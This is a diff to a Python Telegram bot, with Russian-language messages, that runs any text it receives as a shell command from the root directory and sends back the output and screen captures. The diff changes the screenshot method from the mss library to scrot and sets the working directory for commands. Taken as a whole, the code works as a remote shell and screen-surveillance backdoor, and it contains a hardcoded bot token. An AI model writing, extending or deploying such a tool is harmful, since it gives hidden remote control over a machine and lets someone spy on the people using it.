@@ -1,7 +1,6 @@
 import os, io, subprocess, re
 from telegram import Update
 from telegram.ext import Application, MessageHandler, filters
-import mss
 from PIL import Image
 
 TOKEN = "8839915273:AAG-iAMNlAsfY5do3osEOO285kZ9tThBlLc"
@@ -37,7 +36,7 @@ async def handle(update, context):
         await update.message.reply_photo(buf, caption="команда запрещена")
         return
     try:
-        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10, executable="/bin/sh")
+        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10, executable="/bin/sh", cwd='/')
         out = res.stdout + res.stderr
         if not out:
             out = "(пустой вывод)"
@@ -51,12 +50,9 @@ async def handle(update, context):
 
 async def take_screenshot():
     try:
-        with mss.mss() as sct:
-            mon = sct.monitors[1]
-            scr = sct.grab(mon)
-            img = Image.frombytes("RGB", scr.size, scr.bgra, "raw", "BGRX")
-        buf = io.BytesIO()
-        img.save(buf, format="PNG")
+        subprocess.run(['scrot', '/tmp/screenshot.png'], check=True, timeout=5)
+        with open('/tmp/screenshot.png', 'rb') as f:
+            buf = io.BytesIO(f.read())
         buf.seek(0)
         return buf
     except:
